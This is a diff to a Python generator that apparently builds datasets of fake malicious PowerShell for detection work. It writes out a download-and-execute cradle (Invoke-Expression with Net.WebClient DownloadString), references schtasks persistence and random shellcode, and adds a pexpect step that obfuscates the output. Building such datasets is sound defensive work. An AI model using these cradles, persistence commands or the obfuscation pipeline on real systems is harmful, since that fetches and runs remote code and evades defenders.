@@ -1,7 +1,7 @@
 #Generates a powershell script from the set of random malicious commands
 import random
 import string
-import subprocess
+import pexpect
 
 def get_random_dest():
 	path = "/" + "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5,10))])
@@ -31,8 +31,8 @@ def get_random_shellcode():
 	return shellcode
 
 def remote_payload_cmd():
-	ip = get_random_dest()
-	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + ip + "\") \n"
+	dest = get_random_dest()
+	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + dest + "\") \n"
 
 #https://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
 def schtasks_persistence_cmd():
@@ -69,10 +69,18 @@ def generate_raw(n):
 		f.close()
 
 def generate_obfs(n):
+	print("Generating fake malicious powershell")
 	generate_raw(n)
 
+	print("Converting to obfuscated powershell")
 	#Still need to figure out how this is gonna work
 	#p = subprocess.Popen(['powershell.exe', './Invoke-Obfuscation'], stdout=sys.stdout)
+	obfs_commands = "TOKEN,ALL,1,OUT"
+	p = pexpect.spawn("pwsh obfuscate.ps1 -Filename ./res/dataset-0.ps1 -Command " + obfs_commands)
+	p.logfile_read = open("log", 'w')
+	p.expect("default")
+	p.sendline("./res/test.ps1")
 
+	print("Done!")
 
 generate_obfs(10)
